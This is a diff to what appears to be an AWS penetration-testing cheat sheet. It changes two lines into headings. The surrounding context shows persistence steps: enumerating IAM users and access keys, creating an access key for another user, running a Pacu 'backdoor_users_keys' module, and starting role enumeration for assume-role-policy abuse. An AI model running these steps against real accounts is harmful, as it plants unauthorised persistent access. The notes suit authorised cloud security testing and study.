@@ -16,7 +16,7 @@ run aws__enum_spend
 ```
 
 ## Maintain persistence
-Identify user with 0 or 1 access key (need iam:CreateAccessKey)
+### Identify user with 0 or 1 access key (need iam:CreateAccessKey)
 ```
 aws iam list-users --profile Test
 aws iam list-access-keys --user-name Sarah --profile Test
@@ -25,7 +25,7 @@ aws iam create-access-key --user-name Sarah --profile Test
 run iam__backdoor_users_keys
 ```
 
-User with iam update-assume-role-policy
+### User with iam update-assume-role-policy
 Identify non-service-link role
 ```
 aws iam a list-roles --profile Test
